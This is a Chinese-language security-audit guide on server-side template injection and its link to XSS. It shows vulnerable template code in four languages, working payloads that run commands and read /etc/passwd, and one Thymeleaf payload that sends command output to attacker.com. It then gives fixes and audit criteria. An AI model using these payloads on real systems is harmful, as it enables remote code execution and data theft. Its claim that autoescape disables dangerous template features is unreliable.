# XSS - Server-Side Template Injection (SSTI) 与 XSS 交叉漏洞

## Details

### 什么是 SSTI 与 XSS 的关联

Server-Side Template Injection (SSTI) 是指用户输入被插入到模板引擎的模板中，导致模板被重新解析和执行的漏洞。虽然 SSTI 本身不是 XSS，但：

1. **SSTI 可以导致 XSS**：如果模板输出被发送到浏览器，SSTI 执行的结果可能被浏览器解析为 HTML，从而成为 XSS
2. **SSTI 比 XSS 更危险**：SSTI 允许在服务器端执行代码，不仅仅是浏览器
3. **两者都需要关注**：应用可能同时存在 SSTI 和 XSS 漏洞

### 典型代码示例

**Java - Thymeleaf 模板注入：**
```java
@PostMapping("/greet")
public String greet(@RequestParam String name, Model model) {
    // 危险：用户输入被直接用于模板表达式
    String template = "Hello, " + name + "!";

    // 使用 Thymeleaf 处理模板
    ThymeleafTemplateEngine engine = new ThymeleafTemplateEngine();
    return engine.process(template, model);
}
```

攻击载荷：`name: "[[${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}]]"`

**Python - Jinja2 模板注入：**
```python
from flask import Flask, request, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name')
    # 危险：用户输入被直接包含在模板字符串中
    template = f"Hello, {name}!"
    return render_template_string(template)
```

攻击载荷：`name: "{{ 7 * 7 }}"` → 输出 49（证明模板被解析）

更危险的载荷：`name: "{{ __import__('os').system('whoami') }}"`

**PHP - Twig 模板注入：**
```php
<?php
$name = $_GET['name'];
// 危险：用户输入被渲染为模板
$template = "Hello, {$name}!";
$twig = new Twig\Environment(new Twig\Loader\ArrayLoader([
    'template' => $template
]));
echo $twig->render('template', []);
?>
```

攻击载荷：`name: "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ 'id'|id }}"`

**Ruby - ERB 模板注入：**
```ruby
def greet
    name = params[:name]
    # 危险：ERB 将处理用户输入中的 <%= ... %>
    template = "Hello, <%= #{name} %>!"
    erb = ERB.new(template)
    render text: erb.result
end
```

攻击载荷：`name: "<%= system('whoami') %>"`

### SSTI → XSS 利用链

**第一步：SSTI 在服务器执行**
```
POST /api/email HTTP/1.1
Content-Type: application/json

{
  "subject": "{{ 1 + 1 }}",
  "body": "Hello World"
}
```

服务器在模板处理时执行 `{{ 1 + 1 }}`，结果为 `2`

**第二步：输出到浏览器成为 XSS**
```
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Email Subject: 2</h1>

<!-- 如果应用允许 HTML 标签，SSTI 可以注入脚本 -->
```

**具体例子：用户留言板**
```
应用接收用户输入的留言，使用模板引擎处理：
输入：{{ request.environ['HTTP_USER_AGENT'] }}
模板处理结果：Mozilla/5.0 ...

攻击者精心构造用户代理字符串：
User-Agent: "><script>alert('XSS')</script><"

当应用将 SSTI 结果返回到浏览器时：
<div class="message">"><script>alert('XSS')</script><</div>

浏览器执行脚本，导致 XSS
```

### SSTI 更危险的利用

虽然标题提到 "XSS 交叉"，但 SSTI 的真正威害远超 XSS：

**Python Jinja2 - 命令执行：**
```
{{ __import__('os').system('cat /etc/passwd') }}
{{ cycler.__init__.__globals__.os.system('id') }}
{{ lipsum.__class__.__bases__[0].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate() }}
```

**Java Thymeleaf - Java 代码执行：**
```
[[${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}]]
[(#{#request = T(org.springframework.web.context.ContextLoader).getCurrentWebApplicationContext(),#response=#request.getResponse(),#output = @java.lang.Runtime@getRuntime().exec('calc').getInputStream(),#inputStream = new java.io.InputStreamReader(#output),#buffReader = new java.io.BufferedReader(#inputStream),#content = #buffReader.readLine(),#response.sendRedirect('http://attacker.com?content=' + #content)})]
```

**PHP Twig - 命令执行：**
```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ 'id'|id }}
{{ '{}'.constructor.prototype.constructor('console.log("XSS")')() }}
```

### 快速定位核心操作（L1: 关键词扫描）

**模板引擎库识别：**
```
Java: Thymeleaf, Freemarker, Velocity, FreeMarker, JSTL
Python: Jinja2, Mako, Genshi, Chameleon
PHP: Twig, Blade, Smarty, Volt
Ruby: ERB, Haml, Slim, Liquid
JavaScript: EJS, Handlebars, Pug, Nunjucks, Underscore
Go: html/template, text/template
.NET: Razor, DotLiquid, Scriban
```

**危险模式：**
```
render_template_string(user_input)      # Python - 直接模板字符串
ERB.new(user_input).result              # Ruby - 直接模板
new Twig(..., user_input, ...)          # PHP - 直接模板
renderTemplate(user_input)              # 通用 - 直接渲染
Template.fromString(user_input)         # Java - 动态模板
```

**用户输入来源：**
- URL 参数：`?name=...`
- 表单输入：`<input name="message">`
- API 请求体：JSON/XML
- 上传文件内容
- 数据库中读取的数据

### 快速定位保护机制（L2: 跳读）

**正确的防护方式：**

**Python Jinja2 - 使用 render_template：**
```python
# 正确：从文件加载模板，用户数据作为参数
return render_template('template.html', name=user_name)

# 危险：直接渲染用户输入的字符串
return render_template_string(f"Hello {user_input}")
```

**Java Thymeleaf - 参数传递：**
```java
// 正确：通过 Model 传递参数
model.addAttribute("name", userInput);
return "template";  // Thymeleaf 从 template.html 加载

// 危险：直接渲染字符串
String template = "Hello, " + userInput + "!";
engine.process(template, ...);
```

**PHP Twig - 模板文件而非字符串：**
```php
// 正确：从文件加载模板
$twig->render('user_greeting.html', ['name' => $userInput]);

// 危险：直接渲染字符串
$template = "Hello, {$userInput}!";
$twig->render('string:' . $template);
```

**输入验证：**
```
// 检查用户输入是否包含模板语法
if (preg_match('/(\{\{|\{%|{{|}})/', $input)) {
    throw new Exception("Template syntax not allowed");
}

// 白名单验证：如果输入应该是具体值，验证是否在允许列表中
$allowed = ['active', 'inactive', 'pending'];
if (!in_array($input, $allowed)) {
    throw new Exception("Invalid value");
}
```

**审计技巧（L3: 逐行读）：**
- 寻找 `render_template_string()` 或等价函数
- 跟踪用户输入是否进入模板处理函数
- 检查是否存在模板语法过滤（`{`, `}`, `%` 等）
- 验证模板是从文件加载还是从字符串构造

**跨模块保护（L4: 跨模块追踪）：**
- 框架层面：是否有全局的模板渲染钩子
- 配置层面：是否禁用了危险的模板功能
- WAF/防火墙：是否检测和阻止常见的 SSTI 模式

## Classify

### 确认为漏洞

- 用户输入被直接传递给 `render_template_string()` 或等价函数
- 模板引擎被用于处理用户可控的字符串内容
- 未对输入进行 SSTI 语法过滤
- 可以通过数学表达式验证（如 `{{ 7 * 7 }}` 是否返回 49）
- 可以执行更复杂的 SSTI payload（如获取环境变量、执行命令）

### 误报场景

- 用户输入只用于模板参数，而非模板本身
- 模板来自文件系统或配置，已由管理员审核
- 存在严格的输入验证，拒绝包含模板语法的输入
- 模板引擎配置禁用了危险功能（如 Python 中的 `autoescape=True`）
- 输入仅用于展示，模板引擎未被触发

### 代码异味

- 混淆了 "模板参数" 和 "模板内容" 的概念
- 应用中既有安全的模板使用，也有不安全的
- 存在多个地方进行动态模板渲染
- 模板处理逻辑分散在不同的函数/模块

## Low risk

### 降级为低风险的情况

- **参数传递**：用户输入通过参数传递给预定义的模板文件，不是模板内容本身
- **严格验证**：所有用户输入都通过白名单验证，禁止模板语法字符
- **输出编码**：模板输出经过 HTML 编码，防止 XSS（仅能降低一部分风险，SSTI 本身仍然危险）
- **沙箱环境**：模板引擎运行在受限的沙箱中，禁用了命令执行能力
- **低权限账户**：模板引擎运行的进程权限受限，即使被利用也无法访问敏感资源

### 需要额外评估的因素

- SSTI 是否能导致 RCE（远程代码执行）而非仅仅 XSS
- 被执行的代码权限级别（普通用户 vs root/admin）
- 是否能够读取敏感文件（配置、密钥、凭证）
- 是否能够修改应用行为（如注入恶意模板）
- 是否能够进行横向移动（如访问其他用户数据）
